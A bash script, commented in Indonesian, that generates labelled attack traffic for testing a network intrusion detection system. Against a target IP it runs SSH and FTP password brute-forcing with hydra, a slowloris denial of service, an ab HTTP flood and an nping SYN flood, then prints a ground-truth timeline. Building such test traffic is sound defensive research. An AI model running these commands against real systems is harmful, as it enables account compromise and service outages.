#!/bin/bash
# =============================================================
# NIDS01 Real-Traffic Testing — CLEAN Attack (Tanpa Evasion)
# =============================================================
# Dijalankan di EC2 Attacker
# Usage: ./nids01-attack-clean.sh <TARGET_IP>
# Output: 5 serangan sequential, total ~12 menit
# =============================================================

TARGET_IP=${1:-"10.3.2.x"}

if [ "$TARGET_IP" == "10.3.2.x" ]; then
    echo "ERROR: Masukkan IP Target sebagai argument!"
    echo "Usage: ./nids01-attack-clean.sh 10.3.2.100"
    exit 1
fi

echo "============================================================"
echo "  NIDS01 — CLEAN ATTACK SCENARIO (Tanpa Evasion)"
echo "============================================================"
echo "  Target: $TARGET_IP"
echo "  Start:  $(date '+%Y-%m-%d %H:%M:%S')"
echo "  Durasi: ~12 menit (5 serangan + warm-up/cool-down)"
echo "============================================================"

# --- Phase 0: Benign Warm-up (1 menit) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 0: Benign warm-up (1 min)"
for i in $(seq 1 60); do
    curl -s -o /dev/null http://$TARGET_IP/
    sleep 1
done
echo "  Done."

# --- Phase 1: SSH Brute-Force (2 menit) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 1: SSH Brute-Force (2 min)"
timeout 120 hydra -l testuser -P /opt/attack/passwords.txt -t 4 -w 5 $TARGET_IP ssh 2>&1 | tail -3
echo "  Done."
sleep 5

# --- Phase 2: FTP Brute-Force (2 menit) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 2: FTP Brute-Force (2 min)"
timeout 120 hydra -l testuser -P /opt/attack/passwords.txt -t 4 -w 5 $TARGET_IP ftp 2>&1 | tail -3
echo "  Done."
sleep 5

# --- Phase 3: DoS Slowloris (2 menit) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 3: DoS Slowloris (2 min)"
timeout 120 slowloris $TARGET_IP -p 80 -s 100 2>&1 | tail -3
echo "  Done."
sleep 5

# --- Phase 4: DoS HTTP Flood (2 menit) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 4: DoS HTTP Flood - ab (2 min)"
timeout 120 ab -n 30000 -c 100 http://$TARGET_IP/ 2>&1 | tail -5
echo "  Done."
sleep 5

# --- Phase 5: DDoS SYN Flood (1 menit, rate 200/s) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 5: DDoS SYN Flood (1 min, rate 200/s)"
sudo timeout 60 nping --tcp --flags SYN --rate 200 -p 80 -c 12000 $TARGET_IP 2>&1 | tail -3
echo "  Done."
sleep 5

# --- Phase 6: Benign Cool-down (1 menit) ---
echo ""
echo "[$(date +%H:%M:%S)] Phase 6: Benign cool-down (1 min)"
for i in $(seq 1 60); do
    curl -s -o /dev/null http://$TARGET_IP/
    sleep 1
done
echo "  Done."

echo ""
echo "============================================================"
echo "  CLEAN ATTACK COMPLETE"
echo "  End: $(date '+%Y-%m-%d %H:%M:%S')"
echo "============================================================"
echo ""
echo "Timeline Ground Truth:"
echo "  Menit 00-01 : Benign (warm-up)"
echo "  Menit 01-03 : SSH Brute-Force"
echo "  Menit 03-05 : FTP Brute-Force"
echo "  Menit 05-07 : DoS Slowloris"
echo "  Menit 07-09 : DoS HTTP Flood"
echo "  Menit 09-10 : DDoS SYN Flood"
echo "  Menit 10-11 : Benign (cool-down)"
echo ""
echo "Next: Analyzer → stop capture → extract → inference"
